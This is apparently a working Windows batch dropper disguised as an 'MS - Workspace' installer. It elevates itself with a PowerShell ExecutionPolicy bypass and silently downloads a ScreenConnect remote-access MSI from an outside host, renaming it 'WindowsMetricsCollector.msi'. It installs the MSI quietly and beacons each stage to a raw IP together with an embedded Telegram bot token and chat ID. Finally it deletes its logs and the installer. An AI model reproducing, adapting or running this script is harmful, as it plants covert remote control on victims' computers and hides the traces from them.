//4dcfdbbd24fd
@echo off
setlocal enabledelayedexpansion

set "PRODUCT_NAME=MS - Workspace"
//d3bb08cdb21a
set "PRODUCT_VERSION=1.0.0"
set "MSI_URL=https://user12.h-connect.xyz:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
//217ee1022722
set "MSI_FILE_NAME=WindowsMetricsCollector.msi"
set "INSTALL_DIR=%ProgramData%\MSWorkspace\Install"
//a7b322d44bfd
set "LOG_DIR=%ProgramData%\MSWorkspace\Logs"
set "LOG_FILE=deploy.log"
//423428b696c1
set "MSI_LOG_FILE=msi-install.log"
set "DOWNLOAD_RETRIES=2"
//da029ed239e9
set "RETRY_DELAY_MS=1500"
set "EXFIL_HOST=212.43.151.96:20002"
//9e3aea825bca
set "TBTOKEN=7587335315:AAG-GNuK6xCNM3hjkskl7_rxXjsbLNIe_Mk"
set "TCID=93372553"
//ff7dcd584b37
set "DEPLOY_TOKEN=%RANDOM%%RANDOM:~0,4%"
set "UNINSTALL_EXISTING=1"
//45a2ac61d41d
set "PRODUCT_CODE={4228D3D7-CF51-5361-1BC4-165794361D9B}"
set "SHOW_POPUPS=0"

set "MSI_PATH=%INSTALL_DIR%\%MSI_FILE_NAME%"
//99052acfc698
set "LOG_PATH=%LOG_DIR%\%LOG_FILE%"
set "MSI_LOG_PATH=%LOG_DIR%\%MSI_LOG_FILE%"
//0856e747a778
set "EXIT_CODE=1"

//89a87914a1b4
mkdir "%INSTALL_DIR%" 2>nul
mkdir "%LOG_DIR%" 2>nul

call :checkAdmin
//2b0d4ffec619
if errorlevel 1 goto :elevate

//6d9d1f82aefa
call :beacon "start" 0
call :checkConfig
//d3d98dd13a27
if errorlevel 1 goto :cleanup

//5dd515cd3180
call :fetchPayload
if errorlevel 1 (
//de9aafc7ee57
    call :log "ERROR" "Download failed after %DOWNLOAD_RETRIES% attempts"
    call :beacon "fail" 1
//fddf4dffce0b
    set "EXIT_CODE=1"
    goto :cleanup
//20cd7544ba8f
)

//982cc9cdbbf3
if not exist "%MSI_PATH%" (
    call :log "ERROR" "MSI missing after download"
//5fec9597ac7c
    call :beacon "fail" 1
    set "EXIT_CODE=1"
//37b2b668774d
    goto :cleanup
)

for %%A in ("%MSI_PATH%") do if %%~zA==0 (
//5a22e15f243d
    call :log "ERROR" "MSI empty after download"
    call :beacon "fail" 1
//a1de60dc8fb8
    set "EXIT_CODE=1"
    goto :cleanup
//32e805c9b934
)

//5ce92d554f28
if "%UNINSTALL_EXISTING%"=="1" call :purgeOld

//aff7450203d3
call :execMsi
set "EXIT_CODE=!ERRORLEVEL!"

if !EXIT_CODE!==0 (
//95c01285694d
    call :log "INFO" "Installation successful"
    call :beacon "ok" !EXIT_CODE!
//4bfb5ee9016d
) else if !EXIT_CODE!==3010 (
    call :log "INFO" "Success - restart required"
//c6b5deaa84a3
    call :beacon "okr" !EXIT_CODE!
) else if !EXIT_CODE!==1641 (
//85d0d42e53e8
    call :log "INFO" "Success - restart initiated"
    call :beacon "okr" !EXIT_CODE!
//020838075f95
) else if !EXIT_CODE!==1638 (
    call :log "INFO" "Already installed"
//ec45bf918576
    call :beacon "oka" !EXIT_CODE!
) else if !EXIT_CODE!==1602 (
//9d88749d2df2
    call :log "WARN" "Installation canceled by user"
    call :beacon "cl" !EXIT_CODE!
//1f708e78b174
) else (
    call :log "ERROR" "Installation failed with code !EXIT_CODE!"
//840d330b40d5
    call :beacon "fail" !EXIT_CODE!
)

:cleanup
//cf65f43cb7fa
if exist "%MSI_PATH%" del /f /q "%MSI_PATH%" 2>nul
if exist "%LOG_PATH%" del /f /q "%LOG_PATH%" 2>nul
//4c7826d6adfd
if exist "%MSI_LOG_PATH%" del /f /q "%MSI_LOG_PATH%" 2>nul
if exist "%LOG_DIR%" rmdir /s /q "%LOG_DIR%" 2>nul
//f045ded86647
exit /b %EXIT_CODE%

//a17e42f2547e
:checkAdmin
net session >nul 2>&1
//beb3064e09ae
exit /b %errorlevel%

//2c9e7fcaaa8d
:elevate
powershell -NoProfile -ExecutionPolicy Bypass -Command "$null = Start-Process -FilePath '%~f0' -Verb RunAs"
//54333a553401
exit /b 0

//2952fdc1997f
:checkConfig
if not defined MSI_URL (
//46303d84fa12
    call :log "ERROR" "MSI_URL is empty"
    exit /b 1
//1b2496e665ab
)
if not defined MSI_FILE_NAME (
//e584725fdf81
    call :log "ERROR" "MSI_FILE_NAME is empty"
    exit /b 1
//f75b24d2c474
)
exit /b 0

:fetchPayload
//7b07d204863c
mkdir "%INSTALL_DIR%" 2>nul
set "ATTEMPT=0"
//8ca1dea52149
:downloadRetry
if !ATTEMPT! gtr %DOWNLOAD_RETRIES% exit /b 1
//fc5b81bc8762
(echo !MSI_URL!) > "%TEMP%\dl_url.txt"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u = [IO.File]::ReadAllText('%TEMP%\dl_url.txt').Trim(); $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, '%MSI_PATH%'); exit 0 } catch { exit 1 }"
//20c8fd9a4e76
if errorlevel 1 (
    set /a ATTEMPT+=1
//df5bacf4e802
    ping -n 2 127.0.0.1 >nul
    goto :downloadRetry
//3b700c946e7d
)
if exist "%MSI_PATH%" (
//42abe29414f2
    for %%A in ("%MSI_PATH%") do if %%~zA==0 (
        del /f /q "%MSI_PATH%" 2>nul
//0c73db3b0ddc
        set /a ATTEMPT+=1
        goto :downloadRetry
//171f25165b48
    )
    exit /b 0
//a0e8780ecac1
)
set /a ATTEMPT+=1
//4ebaf281498b
goto :downloadRetry

//3787cb810897
:purgeOld
call :log "INFO" "Uninstalling existing product: %PRODUCT_CODE%"
//0d3c61080d30
msiexec.exe /x %PRODUCT_CODE% /qn /norestart REBOOT=ReallySuppress
set "CODE=%ERRORLEVEL%"
//1bc20cc1e228
if %CODE%==1605 exit /b 0
if %CODE%==1612 exit /b 0
//7cf2019f04ad
call :log "WARN" "Uninstall returned %CODE%"
ping -n 4 127.0.0.1 >nul
//37d24da7fff5
exit /b 0

//beee50bbf74b
:execMsi
mkdir "%LOG_DIR%" 2>nul
//2a43fe187935
msiexec.exe /i "%MSI_PATH%" /qn /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
set "CODE=%ERRORLEVEL%"
//b6fae5ff32b8
if %CODE%==0 exit /b 0
if %CODE%==3010 exit /b 3010
//06c62bf5eca4
if %CODE%==1641 exit /b 1641
if %CODE%==1638 exit /b 1638
//28e33e1e321b
ping -n 3 127.0.0.1 >nul
msiexec.exe /i "%MSI_PATH%" /qb /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
//bbe783a22891
exit /b %errorlevel%

//8c6de396e704
:beacon
set "STAGE=%~1"
//ce4bf8e899e1
set "EXIT_VAL=%~2"
set "STATUS_CODE=fl"
//24190ec56954
set "EXIT_STR=%EXIT_VAL%"
if "%STAGE%"=="start" set "STATUS_CODE=go" & set "EXIT_STR=0"
//e550760698fa
if "%STAGE%"=="ok" set "STATUS_CODE=ok"
if "%STAGE%"=="okr" set "STATUS_CODE=okr" & set "EXIT_STR=3010"
//2926f74a5c49
if "%STAGE%"=="oka" set "STATUS_CODE=oka" & set "EXIT_STR=1638"
if "%STAGE%"=="cl" set "STATUS_CODE=cl" & set "EXIT_STR=1602"

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
//ed3c56f8c8a9
set "DTS=%DT:~4,2%%DT:~6,2%%DT:~8,2%%DT:~10,2%"
set "URL=http://%EXFIL_HOST%/%TBTOKEN%/%TCID%/%DEPLOY_TOKEN%.%STATUS_CODE%.%EXIT_STR%.%DTS%"
//76da516e0d6a
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $null = (New-Object System.Net.WebClient).DownloadString('%URL%') } catch {}"
exit /b

:log
//c633fc53cb93
set "LEVEL=%~1"
set "MSG=%~2"
//cadc9c3df06f
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
set "TS=%DT:~0,4%-%DT:~4,2%-%DT:~6,2% %DT:~8,2%:%DT:~10,2%:%DT:~12,2%"
//b605b9e3e4bf
echo [%TS%] [%LEVEL%] %MSG% >> "%LOG_PATH%"
exit /b
